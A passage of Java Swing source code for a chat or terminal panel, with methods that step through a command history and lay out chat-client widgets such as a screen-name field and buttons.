			if(this.alMyCommandHistory == null || this.alMyCommandHistory.size() < 1)
			{
				return false;
			}
						
			//currentCommandHistoryIndex = Math.abs(++currentCommandHistoryIndex);
			currentCommandHistoryIndex = Math.abs(--currentCommandHistoryIndex);
			
			if(currentCommandHistoryIndex <= 0)
			{
				reset = true;
			}
									
			//ensure we remain within bounds
			currentCommandHistoryIndex %= alMyCommandHistory.size();
			
			//set the widget
			if(this.i_am_broadcast_frame)
			{
				this.jtfCommand_Broadcast.setText(alMyCommandHistory.get(currentCommandHistoryIndex));
			}
			else if(this.i_am_private_frame)
			{
				this.jtfTerminalCommand.setText(alMyCommandHistory.get(currentCommandHistoryIndex));
			}
			
			if(reset)
			{
				currentCommandHistoryIndex = this.alMyCommandHistory.size();//get the last added element!
			}
			
			return true;
		}
		catch(Exception e)
		{
			Drivers.eop("moveCommandUp", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	public boolean configureInterface_ChatClient()
	{
		try
		{
			
			
			try
			{
				jpnlOptions_ConnectedClients_South.removeAll();
			}
			catch(Exception e)
			{
				jpnlOptions_ConnectedClients_South.remove(jcbShortcuts);
				this.jpnlOptions_ConnectedClients_South.remove(jbtnPrivate);
				this.jpnlOptions_ConnectedClients_South.remove(jbtnDisconnectClient);
			}
			
			jpnlOptions_ConnectedClients_South.setLayout(new GridLayout(3,1));
			this.jpnlOptions_ConnectedClients_South.add(jbtnClearScreen);
			this.jpnlOptions_ConnectedClients_South.add(jpnlCheckbox_and_jbtnOpen);
			
			jpnlScreenName.add(BorderLayout.WEST, jlblMyScreenName);
			jpnlScreenName.add(BorderLayout.CENTER, jtfMyScreenName);
			this.jpnlOptions_ConnectedClients_South.add(jpnlScreenName);
			
			
		
			jlblConnectedClients_Text.setText("Connected Controllers");
			
			this.i_am_public_chat_frame = true;
			
			jtfMyScreenName.setBackground(Color.blue.darker().darker().darker());
			jtfMyScreenName.setForeground(Color.white);
			jtfMyScreenName.setCaretColor(Color.white);
			jtfMyScreenName.setFont(new Font("Courier", Font.BOLD, 12));
			this.jlblMyScreenName.setOpaque(true);
			this.jlblMyScreenName.setBackground(Drivers.clrBackground);
			this.jlblMyScreenName.setForeground(Drivers.clrForeground);
			
			/*
			jpnlChatTerminal.jtfCommand_Broadcast.setText("FEATURE COMING SOON!!!");
			jpnlChatTerminal.jtfCommand_Broadcast.setEditable(false);
			jpnlChatTerminal.jbtnSend_Broadcast.setEnabled(false);
			jpnlChatTerminal.jbtnClearScreen.setEnabled(false);
			jpnlChatTerminal.jbtnDisconnectClient.setEnabled(false);
			jpnlChatTerminal.jcbAutoScroll.setEnabled(false);
			jpnlChatTerminal.jbtnPrivate.setEnabled(false);
			jpnlChatTerminal.jrbPrivateFrame.setEnabled(false);
			
			
			jpnlChatTerminal.jcbShortcuts.setEnabled(false);
			jpnlChatTerminal.jbtnOpenFileHive.setEnabled(false);
			jpnlChatTerminal.jlstConnectedClients.setEnabled(false);
			jpnlChatTerminal.txtpne_broadcastMessages.appendStatusMessageString(false, "------------>>>>>>>> THIS FEATURE IS COMING SOON!!!");
			 */
			
			this.validate();
			
			return true;
		}
		catch(Exception e)
		{
			Drivers.eop("configureInterface_ChatClient", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	public boolean moveCommandDown()
	{
		try
		{
			//boolean reset = false;
			
			if(this.alMyCommandHistory == null || this.alMyCommandHistory.size() < 1)
			{
				return false;
			}
						
			//currentCommandHistoryIndex = Math.abs(++currentCommandHistoryIndex);
			currentCommandHistoryIndex = Math.abs(++currentCommandHistoryIndex);
			
			/*if(currentCommandHistoryIndex >= this.alMyCommandHistory.size())
			{
				reset = true;
			}*/
									
			//ensure we remain within bounds
			currentCommandHistoryIndex %= alMyCommandHistory.size();
			
			//set the widget
			if(this.i_am_broadcast_frame)
			{
				this.jtfCommand_Broadcast.setText(alMyCommandHistory.get(currentCommandHistoryIndex));
			}
			else if(this.i_am_private_frame)
			{
				this.jtfTerminalCommand.setText(alMyCommandHistory.get(currentCommandHistoryIndex));
			}
			
			/*if(reset)
			{
				currentCommandHistoryIndex = this.alMyCommandHistory.size();//get the last added element!
			}*/
			
			return true;
		}
		catch(Exception e)
		{
			Drivers.eop("moveCommandDown", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}

}
